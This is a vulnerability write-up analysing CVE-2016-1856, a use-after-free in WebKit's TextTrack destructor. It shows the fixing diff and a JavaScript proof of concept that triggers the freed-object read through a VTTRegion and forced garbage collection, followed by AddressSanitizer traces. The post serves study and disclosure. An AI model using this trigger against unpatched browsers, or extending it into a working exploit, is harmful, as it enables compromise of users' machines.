---
title: Notes of a simple UAF in TextTrack destructor
excerpt: "Notes of CVE-2016-1856"
modified: 2017-03-31
tags: [Notes,UAF,Attack Model,Lokihardt]
category: 933KY
---

CVE-2016-1856 is used by Lokihardt on Pwn2Own 2016, let's see the patch:

```diff
@@ -136,11 +136,11 @@ TextTrack::~TextTrack()
             m_client->textTrackRemoveCues(this, m_cues.get());
 
         for (size_t i = 0; i < m_cues->length(); ++i)
-            m_cues->item(i)->setTrack(0);
-        if (m_regions) {
-            for (size_t i = 0; i < m_regions->length(); ++i)
-                m_regions->item(i)->setTrack(0);
-        }
+            m_cues->item(i)->setTrack(nullptr);
+    }
+    if (m_regions) {
+        for (size_t i = 0; i < m_regions->length(); ++i)
+            m_regions->item(i)->setTrack(nullptr);
     }
     clearClient();
 }
```

It moves ```if (m_regions) {``` out of the code block, which means there is a situation that **m_regions** exists while **m_cues** is null.

The vulnerability can be trigger as follows:

```javascript
 function trigger() {
 	  var vr = new VTTRegion();
	  var v = document.createElement("video");
	  v.appendChild(document.createElement("track"));
	  v.textTracks[0].addRegion(vr);
	  v = null;
	  gc();
	  alert(vr.track);
}

```
It just creates a **video** element and append the **TextTrack** with VTTRegion but no cues. After ```gc()```, the ```vr.track``` still access the items in the  freed object which didn't ```setTrack(0)```.

Log of ASAN bellows:

Use:	```alert(vr.track)```

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x61400008dc90 at pc 0x00010e2b6d5a bp 0x7fff5efe8890 sp 0x7fff5efe8888
READ of size 8 at 0x61400008dc90 thread T0
    #0 0x10e2b6d59 in JSC::Weak<WebCore::JSDOMObject>::get() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8c9d59)
    #1 0x10e2b6d14 in WebCore::ScriptWrappable::wrapper() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8c9d14)
    #2 0x1103adf16 in WebCore::getInlineCachedWrapper(WebCore::DOMWrapperWorld&, WebCore::ScriptWrappable*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x29c0f16)
    #3 0x1115fb2ca in JSC::JSObject* WebCore::getCachedWrapper<WebCore::TextTrack>(WebCore::DOMWrapperWorld&, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0e2ca)
    #4 0x1115f9c39 in JSC::JSValue WebCore::getExistingWrapper<WebCore::JSTextTrack, WebCore::TextTrack>(WebCore::JSDOMGlobalObject*, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0cc39)
    #5 0x1115f8286 in WebCore::toJS(JSC::ExecState*, WebCore::JSDOMGlobalObject*, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0b286)
    #6 0x1116756f7 in WebCore::jsVTTRegionTrack(JSC::ExecState*, long long, JSC::PropertyName) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c886f7)
    #7 0x1097f345c in JSC::PropertySlot::customGetter(JSC::ExecState*, JSC::PropertyName) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x263145c)
    #8 0x107541b5c in JSC::PropertySlot::getValue(JSC::ExecState*, JSC::PropertyName) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x37fb5c)
    #9 0x107540d50 in JSC::JSValue::get(JSC::ExecState*, JSC::PropertyName, JSC::PropertySlot&) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x37ed50)
```

Free:	```v = null``` --> ```gc()```

```
freed by thread T0 here:
    #0 0x1056ae799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x109e6ca94 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2caaa94)
    #2 0x109d61273 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f273)
    #3 0x109d61215 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f215)
    #4 0x109d5fce4 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9dce4)
    #5 0x109d5f374 in WTF::fastFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9d374)
    #6 0x10dddc124 in WTF::RefCounted<WebCore::TrackBase>::operator delete(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3ef124)
    #7 0x111942641 in WebCore::LoadableTextTrack::~LoadableTextTrack() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3f55641)
    #8 0x10dddf735 in WTF::RefCounted<WebCore::TrackBase>::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3f2735)
    #9 0x10fbf4c19 in void WTF::derefIfNotNull<WebCore::LoadableTextTrack>(WebCore::LoadableTextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2207c19)
    #10 0x10fbf4b6a in WTF::RefPtr<WebCore::LoadableTextTrack>::~RefPtr() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2207b6a)
    #11 0x10fbefcf4 in WTF::RefPtr<WebCore::LoadableTextTrack>::~RefPtr() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2202cf4)
    #12 0x10fbed228 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2200228)
    #13 0x10fbed264 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2200264)
    #14 0x10fbed2b8 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22002b8)
    #15 0x10e2cd5ae in WebCore::removeDetachedChildrenInContainer(WebCore::ContainerNode&) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8e05ae)
    #16 0x10e2aa8ad in WebCore::ContainerNode::removeDetachedChildren() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8bd8ad)
    #17 0x10e2ab291 in WebCore::ContainerNode::~ContainerNode() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8be291)
    #18 0x10efd5717 in WebCore::Element::~Element() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15e8717)
    #19 0x1135aa912 in WebCore::StyledElement::~StyledElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x5bbd912)
    #20 0x10de0ac64 in WebCore::HTMLElement::~HTMLElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x41dc64)
    #21 0x10fa531d4 in WebCore::HTMLMediaElement::~HTMLMediaElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x20661d4)
    #22 0x10fc1ec77 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2231c77)
    #23 0x10fc1d8c4 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22308c4)
    #24 0x10fc1d8e8 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22308e8)
    #25 0x111f110c6 in WebCore::Node::removedLastRef() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x45240c6)
    #26 0x10da04ece in WebCore::Node::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x17ece)
    #27 0x111f014f4 in WebCore::Node::derefEventTarget() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x45144f4)
    #28 0x10e9eff32 in WebCore::EventTarget::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1002f32)
    #29 0x10eeef0c9 in WTF::Ref<WebCore::EventTarget>::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15020c9)
```

